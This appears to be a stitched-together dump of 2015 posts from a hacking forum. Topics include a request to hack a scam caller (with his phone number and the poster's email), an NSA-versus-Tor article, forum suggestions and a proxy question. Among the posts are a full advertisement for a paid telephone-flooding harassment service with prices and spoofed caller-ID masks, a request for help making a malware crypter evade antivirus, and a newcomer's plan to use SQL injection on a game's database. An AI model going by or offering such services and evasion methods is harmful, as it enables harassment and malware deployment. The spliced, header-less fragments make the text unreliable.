Hack a criminal&#39;s phone - Challenges - HackHound,hack-a-criminals-phone,chasbrat,8/1/2015 0:00,"My name is Jean-Paul. I am in New Orleans. I received phone call an hour ago from a New York phone number. I'm a reporter, so I answer all calls. A man with what I believe to be a Haitian accent told me that there was a woman that he was in an accident with and her jaw was broken, so she couldn't speak. He said he had handed her his phone so she could call someone and she had dialed my number. I freaked out. I thought it was my sister. In my emotional state, I asked him if she was driving a Jeep Cherokee (her model car) and he said yes. At that point, I asked if he could ask if her name was XXXXX [I'm omitting that]. Then he handed the phone to another Haitian man, and he said that she hit his friend's BMW and they didn't want to call the police because his friend is wanted. They had my sister held hostage in his grandmother's basement (which there are none in New Orleans). So I realized then that my sister was probably alright. I asked to hear her voice. He refused. I said send me a picture of her. He refused. I texted her. She's fine. So, does anybody want to find this @$$hole's GPS location so we can give it to NYPD so he and his little friend can go to jail where they belong? Also, feel free to wreak havoc on his phone, life, bank accounts, social media, because he's a scumbag. The number is (347) 403-1480 Email any results to jeanpaul.arguello@gmail.com, if you would. I want to know this guy either goes to jail or at least like extortion isn't worth the trouble anymore.",Newbie

Hack a criminal&#39;s phone - Challenges - HackHound,hack-a-criminals-phone,BullDog,8/2/2015 0:00,"Alright here's the thing: neither doxing (sharing/publishing other peoples personal information), nor requests to 'hack' someone are welcome here. The main reason for that is, that there's no way for us to verify whether or not someone is telling the truth and/or doesn't have any ulterior motives (I'm not saying that I don't believe your story, I'm just talking in general). That being said, the number you posted does seem to be known for spam-calls, which is why I won't remove it. Here's my advice for you (even though you may not going to like it): Don't expect the police to do much about this, because they likely won't. Read up on how confidence tricks (and psychological manipulation in general) work and how to protect yourself against it. Don't be so naive: If you are suspicious about a call like that (which from now on you will be), don't ask the person yes-no questions (in your case I'm referring to the questions about the model of the car and the name of your sister). As racist as this may sound: be suspicious about calls from people with accents. And finally: overcome your desire for retribution and be happy about the fact that nothing actually happened to your sister and that you've learned something from it instead.",AdvancedMember
Hack a criminal&#39;s phone - Challenges - HackHound,hack-a-criminals-phone,x58,8/2/2015 0:00,"That's sociale engineering approach my friend. Not hacking. Like Bulldog already wrote. The phone number is probably a disposeble prepaid or a landline phone somewhere. Finding those people ain't that easy. The only way for you to find them is to search for a reason why they would do that. Which is in your case not getting easier as you can make a lot of enemies with your job. If someone doesn't want to truth to come out and you release it they will try to take revenge in any possible way. Same story with the so called ""sochi snoopers"" that journalists are target of. Better just change phone number, delete all your social media and other real infornation about you of the surface of the net to avoid this to happen again by other crooks. I kind of had the same story a year ago. But I've recorder all the conversations, wrote them down and analyzed the text. So turned out it was a really close match to how a old friend of mine talks and says things.. Same way of building up a sintence and the words he used. A few days after that I confronted him about it and he was amazed. But Yeah I understand how the situation must have been for you.

To calculate the offsets you take the raw (hex) offset and loop the section table until you find the section the offset belongs to (if hex offset within (section raw offset + section raw size) you have the correct one). to calculate the va you take then the section virtual address + imagebase + add the (hex offset - section raw offset) to it. As for ASLR inline pacthes I suggest you enum the running processes with toolhelp function and once you got the imagebase you can apply the simple math stuff from above ^^^ to find the correct position.

Suggestions - DashBoard - HackHound,suggestions,x58,8/14/2015 0:00,"Hi Hackhound community, The reason why I am asking this is because I've seen a big drop in activity in the forums. I am not comparing activity with quality being posted and discussed in several topics, quality is hard to find these days. I think we still do good. We got a few good active and smart members aboard so that should be fine. So the question now Are there any suggestions or things you would like to see in HackHound? Changes or more crucial things being added/changed. For example New section(s) / Less sections Less themes / more themes / No themes? (Who cares tbh) More activity? Application(s) (Such as hh scanner or similar) Less features / more? More security (Google's 2FA. My opinion, I don't trust Google, bad idea?)

Suggestions - DashBoard - HackHound,suggestions,Abdul1,8/14/2015 0:00,"So firstly, HH is the only place which hasn't gone to a complete pile of shit, that's why I'm still here (like it or not lol) Lemme just comment on the bulletproints you mentioned. (green = yes/vote for it, yellow = partially agree, red = gtfo) New section(s) / Less sections -- I think it's fine already. Yes some sections are basically dead, but honestly, who cares? Nothing more annoying than searching for a non existant section when you want to post something No more themes / more themes (Who cares tbh) -- Correct, standard theme is nice and sleak (carbon), and this is not leakforums or some shit. More activity? - Nothing you or anyone could really change, right? It's not too bad atm imho. I gotta say I like the way how you are starting threads sometimes, which aren't the typical ""help me meyk tha c0dez workz"" but rather an introductory for a further discussion (even though I'm personally not interested in most of the hardware stuff you are writing about, and therefor can't really say something there ) Application(s) (Such as hh scanner or similar) -- ""nice to have"", but really necessary? I think HH should be remembered for more than ""uuh there is free sc4nn0r for my viruz"". Less feature? -- wat More security (Google's 2FA. My opinoin, I don't trust Google, bad idea?) -- Yeeeeeeeeeeees. Fuck man, not that there's an account hijack everyday, but it's relatively easy to add, and multiplies security by 8.

We could remove those sections that are completely inactive though. Less themes / more themes / No themes We definitely don't need more themes. We currently have 12 (10, without mobile themes) and I'm fairly sure that 90% of users use DarkEnergy. More activity More activity would be great of course, but it's not easy to achieve (if you want decent people). Applications (such as hh scanner or similar) In my opinion it might drive the wrong kind of people here. Less / more features Depends on the kind of features. I for one can't think of any off the top of my head. More security More security is always good, so why not. Contests with prizes Yeah if enough members were to participate I think it's a great idea. We used to do it back in the days and it usually was pretty fun. Get rid of the useless member ranks Like x58 mentioned, we already cleaned up the user ranks. In my opinion they're fine the way they are now, with Members (just joined), Members+ (have contributed/posted), Loyalists (long time members) and Notorious (well-known members). SSL This has previously been discussed Please Login or Register to see this Hidden Content , and I still stick with my opinion - it's completely unnecessary for a forum. More generic challenges with explanatory spoilers. I think that would be a nice idea, if a couple of knowledgeable members were interested in creating such challenges. There could even be a new section for it. A wiki for terminology with a blackhat touch to it, linking to internal threads? I would be open for the idea, again if there were volunteers interested in managing that; but I think there are too many similar wikis out there already. The tutorials don't get enough recognition. Agreed. I think there was an option in the Tutorials Mod that would allow the creator to also automatically make a new topic, with a link to that tutorial. That might help with popularity and individual feedback/discussion. The market place is probably a magnet for the wrong kind of people. I somewhat agree, but don't really know what to do about it. Maybe sharpen the rules? Create crews for hacking, reversing, coding and designing = work on HH-Projects as a team. I think we used to do that back in the day. I wouldn't mind having crews again (and maybe give them their own individual section?). This should be discussed in more detail, if others are interested in it as well. Awards and competitions. I never really liked all that award stuff on forums, but I would be open to it, if enough users wanted it. Competitions/contests are a great idea in my opinion (see above). I can't really think of much to change that hasn't been mentioned already. I'll extend the list below, if something else comes to mind. Use the frontpage (articles) more.

We offer you the service “telephone flood” from FloodClub. We work with “black lists”, voice menu and multi-line phones. Free five-minute test drive to your phone. Mobile and fixed numbers of CIS: 1 stream for 24 h. = 10$; each next stream + 8$; Bonuses for orders with more than 72 h. 1 stream with retention, compliance with the IVR terms or playing record = by agreement $/h. Mobile and fixed numbers of EU: 1 stream for 24 h. = 16 €; each next stream + 10 €; 1 stream with retention, compliance with the IVR terms or playing record = 9€ /h; Nice bonuses for long-term orders. Mobile and fixed numbers of USA: 1 stream for 24 h. = 20 $; each next stream + 15 $; 1 stream with retention, compliance with the IVR terms or playing record = 13$ /h; Other numbers: By arrangement, in the presence of routes for particular regions. Please read the answers to frequently asked questions (FAQ): What is the “stream”, what their quantity does affect and how to choose the required number? The number of streams is a quantity of lines (canals) using for the simultaneous dial to subscriber. By using one line a new call to subscriber could be initiated only after the end of the previous call. By using two or more lines simultaneous number of calls could be initiated, which is equal to the number of lines. It will reduce the gap between calls and/or make the attacked subscriber’s incoming line unavailable for calls. The quantity of used lines depends on customer’s aims: for “annoying calls” using one line is enough. If the aim is to make a subscriber unavailable for all calls it’s need to select the number of treams to meet or exceed the number of subscriber’s incoming lines. The majority of mobile numbers have two incoming lines, so, to achieve an effect of “busy” recommend to use two or more streams. What does “auto login to line”, “voice mail”, “flood with retention” mean? Auto login to line, voice mail mean any action on the side of attacked subscriber, which leads to the beginning of tariffing after the connection. In that case simple flood with retention after the rising a handset will not lead to expected result, in such cases we use flood with retention on the line with the implementation of necessary actions (for example, pressing the key “3”). Is there the gap between calls while using one stream? After the end of the previous connection time of setting a new connection depends on such factors as type of the subscriber (mobile/fixed), load on the operator’s network of the subscriber in the current time, the routes using by the operator for the current call etc. According to our observations, the average interval between call can vary from 3 to 15 seconds. The gap reduces by one third with each additional stream. Do you have all calls from one number or different numbers? We have an opportunity to set number to display while the incoming call, and believe that it’s not in our interests to specify it in one instance By default for orders in Russia we use the followimg numbers to show, where * = random digit: 7901******* 7902******* 7903******* 7904******* 7905******* 7906******* 7908******* 7909******* 7910******* 7911******* 7912******* 7913******* 7914******* 7918******* 7920******* 7921******* 7925******* 7926******* 7928******* 7937******* 7953******* 7965******* 7968******* 7984******* 7985******* 7999******* 7988******* 7999******* 7987******* By default for orders in Ukraine we use the following masks: 38050******* 38066******* 38095******* 38099******* 38067******* 38096******* 38097******* 38098******* 38063******* 38093******* 38068******* 38092******* 38091******* 38094******* 38039******* By default for orders in Belarus we use the following masks: 375293****** 375443****** 375295****** 375335****** 375252****** 375294****** By the customer’s request there will be set any masks that conform to E.164-standart. Installation of specific numbers is possible; they will be displayed among the rest. A subscriber has the redirect according to the signal “busy”, what to do? In this case, we recommend to increase the amount of stream for this number. While setting the redirect according to the signal “busy” calls will be redirected on subscriber’s mentioned number, including flood calls (when using two or more streams), but the effectiveness of flood will be slightly decreased, because subscriber has 1-2 new additional streams. In normal mode the attacked subscriber couldn’t use the phone, but the incoming call can be accepted with luck and subscriber’s persistence. We work trough the guarantor, ready to be tested.

"[Article] NSA vs. Tor Network - Security, Anonymity & Privacy - HackHound",article-nsa-vs-tor-network,Abdul1,8/20/2015 0:00,"This article was taken from the hiddenwiki, no author is stated (obviously) Some user still seem to be quite uncertain about that topic, so.. NSA vs Tor The National Security Agency has had limited success in cracking Tor communications. Here's what we have learned about the anonymizing network. NSA thinks Tor stinks It's a measure of Tor's reliability that a secret NSA presentation -- labeled ""top secret"" -- sports the title ""Tor Stinks."" The presentation reads, ""We will never be able to de-anonymize all Tor users all the time,"" and adds, ""With manual analysis we can de-anonymize a very small fraction of Tor users."" But that de-anonymization, to date, appears to have been random. Notably, the agency reports no success at unmasking the identity -- in response to a specific intelligence or law enforcement demand -- of a specific requested Tor user. Meanwhile, another top-secret briefing document dubs Tor ""the king of high-secure, low-latency Internet anonymity."" In other words, earlier advice from Snowden himself -- about how strong encryption and Tor were reliable techniques for avoiding the NSA's digital dragnet -- appear to remain true. NSA still actively targets Tor Still, NSA documents published by The Guardian show that the agency does have a collection of practical techniques, dubbed EgotisticalGiraffe, for attempting to defeat Tor. The techniques used by the agency for outing some small fraction of users have included everything from ""cookie leakage"" to ""dumb users (EPICFAIL),"" with the latter no doubt referring to people who inadvertently reveal their identity despite using Tor. Attacks haven't cracked Tor itself But according to cryptographer and information security expert Bruce Schneier, who's been reviewing documents leaked by Snowden, the NSA hasn't succeeded in breaking Tor itself. ""Tor is a well-designed and robust anonymity tool, and successfully attacking it is difficult,"" Schneier said Monday in a blog post. ""The NSA attacks we found individually target Tor users by exploiting vulnerabilities in their Firefox browsers, and not the Tor application directly."" However, Schneier added, anyone who wants to make life more difficult for the NSA can also turn off vulnerable services like scripts and Flash when using Tor, making it difficult to target those services. The NSA has enjoyed some past success by attacking bugs in the Firefox browser, which is used to create the prebuilt Tor Browser Bundle. ""The good news is that they went for a browser exploit, meaning there's no indication they can break the Tor protocol or do traffic analysis on the Tor network,"" said Tor project core member Roger Dingledine (aka ""arma"") in a blog post. ""Infecting the laptop, phone or desktop is still the easiest way to learn about the human behind the keyboard."" Another upside of the NSA's limited success is that even when it can unmask Tor users, it risks losing that capability by using it too frequently. ""Tor still helps here: you can target individuals with browser exploits, but if you attack too many users somebody's going to notice,"" Dingledine said. ""So even if the NSA aims to surveil everyone, everywhere, they have to be a lot more selective about which Tor users they spy on."" Fingerprints Track Tor Users How has the NSA tracked some Tor users? This begins with NSA's ability to eavesdrop on the large portions of the Internet with the help of ""partner"" U.S. telecommunications companies, through programs with codenames such as Blarney, Fairview, Oakstar and Stormbrew. ""The NSA creates 'fingerprints' that detect HTTP requests from the Tor network to particular servers,"" Schneier explained. ""These fingerprints are loaded into NSA database systems like XKeyscore, a bespoke collection and analysis tool that NSA boasts allows its analysts to see almost everything a target does on the Internet"" -- including even encrypted VPN traffic. NSA Sifts Internet To Spot Tor Use The NSA then applies big data techniques -- using tools with codenames such as Tumult, Turbulence and Turmoil -- to identify Tor communications among the massive amount of Internet activity that it intercepts. But detecting Tor use isn't the same as identifying any given Tor user. ""The very feature that makes Tor a powerful anonymity service, and the fact that all Tor users look alike on the Internet, makes it easy to differentiate Tor users from other Web users,"" said Schneier. On the other hand, Schneier pointed out, the anonymity provided by Tor makes it impossible for the NSA to know who the user is, or whether or not the user is in the U.S. and thus most likely someone that the agency, by law, should not be surveilling. NSA Redirects Tor Users To An Attack Server If the NSA identifies a target that it wants to track, it then relies on a fleet of high-latency -- or ""quantum"" servers -- that try to redirect a targeted system to one of a series of NSA servers, codenamed FoxAcid, which launch man-in-the-middle attacks that attempt to infect the system. ""Once the computer is successfully attacked, it secretly calls back to a FoxAcid server, which then performs additional attacks on the target computer to ensure that it remains compromised long-term and continues to provide eavesdropping information back to the NSA,"" said Schneier. Each FoxAcid server is a Windows 2003 computer configured with custom software and a series of Perl scripts, he said. The malware introduced by the servers can reportedly survive reboots. FoxAcid Burns Only Designated Systems FoxAcid servers are publicly reachable by any Internet user -- and disguised with innocuous names -- but serve exploits only against PCs that arrive via an HTTP link that includes a ""FoxAcid"" tag. These tags are reportedly sometimes also served up via phishing attacks. A Guardian story detailed a sample URL for a FoxAcid server -- although this was later redacted -- that demonstrates how the servers may disguise their true identity. ""Note that the server sometimes serves up an EFF link,"" tweeted Jacob ""ioerror"" Appelbaum, who's a core member of the Tor project, referring to the website of the Electronic Frontier Foundation. Quantum Cookie Attacks Another technique the agency might employ to track users has been via what leaked NSA documents describe as a Quantum Cookie, reported Ars Technica. Notably, one slide from the Tor Stinks presentation was titled ""Analytics: Cookie Leakage,"" with references reading, ""DoubleclickID seen on Tor and nonTor IPs."" That suggests that an advertising cookie planted on a PC might allow the NSA to authenticate and track even a Tor-using PC. But based on a technical review of what's included in the slide, the cookie attack focused on ""Torbutton,"" a Firefox extension that Tor stopped supporting in May 2011 after ongoing reports that it leaked data. NSA Spies For Foreign Intelligence, Counterintelligence Purposes The U.S. government hasn't sat on the sidelines while these secret intelligence agency operating procedures have been publicized. In a statement released Friday, director of national intelligence James R. Clapper argued that recent press accounts about the NSA's surveillance techniques ""fail to make clear that the intelligence community's interest in online anonymity services and other online communication and networking tools is based on the undeniable fact that these are the tools our adversaries use to communicate and coordinate attacks against the United States and our allies."" In addition, he said, the agency must -- and does -- comply with laws that restrict its spying to ""valid foreign intelligence and counterintelligence purposes."" But as Schneier noted, since the agency can't distinguish Tor users who are American residents from foreigners -- or even terrorists -- users of anonymizing services such as Tor will likely remain at risk of being tracked by the agency.

Suggestions - DashBoard - HackHound,suggestions,x58,8/20/2015 0:00,"My suggestion would be to show more shouts from the past in the lounge (shoutbox), I can only see like the last 20 or something, don't know if this is because of my user type/low post number. As far as I remember, you could see convos that have happened months before on forums like t-f, my suggestion is something like that. A lot of activity is happening in the shoutboxes and it can be hard to communicate if you don't see what happened 30 or more shouts ago. A limit was set to reduce server load. The archive of the Sb works. I know the Sb should show more posts, but this causes problems. Maybe we should start a webirc.hackhound.org host record and have a irc channel so people can have better and longer conversations. The Sb wasn't really put up here to have long conversations, help etc. It's just so people can chat a bit or say hi how's your day, should we start a project, whatever. The question is, if they cant accomplished a sqli or some bufferoverflow, what are they doing here? Even if they can't accomplish it, some people could point beginners (or people who aren't good in websec for example to a from A to Z tutorial or book on the basics of it) The challenge is then to learn, understand it and take it to practice. So I Agree to Tigerass. IamLupo made a nice challenge in C. Server.c that has a bufferoverflow, now the challenge was to write a payload for it and hijack the system by RCE. But first you need to get the return values and see/calculate how much space you have for your shell payload. Not sure if ^^ is written correctly. But something like that could be really useful to understand how those kind of attacks work.",Advanced

Norton Sonar + Bitdefender Information? - Programming (Un)Detection - HackHound,norton-sonar-bitdefender-information,0x221,9/1/2015 0:00,"I know there has been other threads about this subject but i was hoping for some new information lately ive been looking into different AV's to bypass on my private c++ crypter. currently it bypasses eset(not always), avira, and kaspersky + some others... Im using LoadPE which seems to work quite well for me instead of runpe. But lately Bitdefener and Norton has been giving me headaches. Can anyone give me any facts about these AV's ? To me it looks like Norton almost hooks every fucking API i feed it. It even detected my tiny builder which does no malicious activity at all. Sonar even triggers when i try to use the API QOpenFileDialog, ridiculous tbh. I find this very strange, Bitdefender also seems to detect absolutely everything. I dont expect anyone to share their private methods, however some information that can shed some light on this case would be great. Thanks Edited by 0x221, 01 September 2015 - 04:02 AM.",Newbie

"[Article] NSA vs. Tor Network - Security, Anonymity & Privacy - HackHound",article-nsa-vs-tor-network,thecoon,9/3/2015 0:00,"TOR is still protected even if they run a thousand nodes. That would be a good thing, actually. TOR is under heavy load these days and is suffering denail of service attacks from a lot of different angles. The biggest issue now is TOR is being over run with botnets that were written really poorly. It works like this: C&C 1 goes up. Hacker spreads TOR bot to thousands of people. C&C operator lost hosting. Slaves STILL try to call back home. As long as slaves stay FUD the network is under heavy load. Then there is the dos attacks from people who are trying to knock kiddie porn down. TOR is still mostly used to sell illegal services/goods and hard candy porn. The only REAL way so far to even come close to messing with TOR is to install monitors at the ISP. Again, this was hacked teams big idea but it is not practical. I, and most of you, will notice the second this happens and will simply jump out with a tunnel before jumping back in to an appropriate node. So even if the NSA hates TOR they can't stop it but I do think they are responsible for a lot of the denial of service. We all know they would use super computers with mega bandwidth do knock the entire network down. Every major nation employs the exact same tactic at times of war to disrupt enemy infrastructure. As soon as legislation passes that associates TOR with terrorist activity, it will be nuked. Until then it is as safe as you make it.",Beginner

So overprices, could have saved money on that. Anyways about your previous notebook, did it had a nvidia chipset? If so, yeah reballing/reflowing costs at least 150 eur. And doesn't even give you reliability as it can die quickly after such repair if you're unluck..",Advanced

I have been looking for a good hacking/exploit type community, one where the members aren't douchebags. After reading around here, I seen that the members here don't mind helping those who help themselves, which is awesome. I am 21 years old, and I have never gotten into Cyber security type stuff seriously before, and I am hoping it is not too late to start, as I know many people start when they are young. I'm really excited to learn anything and everything I can. When I was younger, I played around with keyloggers to hack accounts for an online game I played, but hat is about it. I would really like to become proficient in hacking in general, as I would like to be a grey/whitehat hacker one day. Right now the big thing I am interested in learning is SQLi and cracking/hacking website databases. Again, it is for another online game I play, that's pretty low budget, so I'm hoping thier security isn't top notch. Howvever, that isn't the onlly reason I'm here. I am also a programmer, I use mainly C# and .NET, I am learning it in university right now. I'm going to school to get my Associates Degree in Information Technology speacializing in Multi-Platform Software Development. I have a few basic programs here at HackHound, right now its just easy things such as a proxy scraper that visits a list of pre-efined proxy site and grabs the proxies on the site.My next one will probably be a proxy checkeer to go with the scraper, you would be able to load the list of proxies you just scraoed and save the ones that work. Well, that is about all I can think of now. If anyone knows of any good guides I should read to get me on my journe, that would be highly appreciated.

I'm building some MMO games, and I'm experimenting with proxies.. or I try at least. Since players can login to the game, some players may have laggs, if I run a game in Europe, Some American players may lagg. What I've done is I got another dedicated server in America with Linux, now I try to figure out how I make that dedicated server to act like a proxy for my game. When players login, they load a character list, my goal is to have all characters to have 2 login options. 1: Login normally 2: Login through Proxy-Dedicated that will act like a router and hopefully lower your latency. I've found a lot of tutorial how to set up these kind of proxies... but for websites..... I just want to figure out how the hell I make that Dedicated-proxy to act like a router and send all incoming traffic to the actual game, receive traffic from game and send it back to the player. So from inside the game, checking the players IP will result that I see the IP of the proxy server. I'm really bad at explaining things, but I hope you understand and that you can point me were to find my solution... using google only brings up about website how to bypass government blocks and shit This is a code I found: ssh -f -N -D 0.0.0.0:1080 localhost but that command is probably dead wrong as it also had with websites to do Any help is highly appreciated!",Member
